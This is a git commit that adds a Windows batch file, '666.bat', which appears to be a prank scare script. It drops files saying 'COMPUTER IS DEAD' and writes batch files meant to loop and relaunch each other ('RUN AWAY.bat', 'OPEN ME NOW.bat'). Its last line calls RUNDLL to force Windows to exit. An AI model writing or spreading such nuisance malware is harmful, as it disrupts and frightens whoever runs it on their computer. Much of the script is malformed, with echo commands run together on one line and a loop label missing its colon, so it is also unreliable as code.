ff9f5d38c894c7976cab410e548c9b50bf11449a
Matthew <mcissell5115@gmail.com>
2025-08-16 16:44:47 -0500

    Add files via upload

---
+++ 666.bat
@@ -0,0 +1,9 @@
+@echo off
+echo COMPUTER IS DEAD >> "N.txt" echo COMPUTER IS DEAD >> "No.txt" echo COMPUTER IS DEAD >> "No E.txt" echo COMPUTER IS DEAD >> "No Es.txt" echo COMPUTER IS DEAD >> "No Esc.txt" echo COMPUTER IS DEAD >> "No Esca.txt" echo COMPUTER IS DEAD >> "No Escap.txt" echo COMPUTER IS DEAD >> "No Escape.txt" echo COMPUTER IS DEAD >> "!!!.txt" echo @echo off >> "RUN AWAY.bat" echo loop >> "RUN AWAY.bat"
+echo echo RUN AWAY >> "RUN AWAY.bat"
+echo goto loop >> "RUN AWAY.bat"
+echo start RUN AWAY.bat >> "RUN AWAY.bat"
+echo @echo off >> "OPEN ME NOW.bat"
+echo echo DO NOT LOOK BEHIND YOU!! >> "OPEN ME NOW.bat"
+echo start RUN AWAY.bat >> "OPEN ME NOW.bat"
+RUNDLL.exe user.exe,ExitWindowsexec
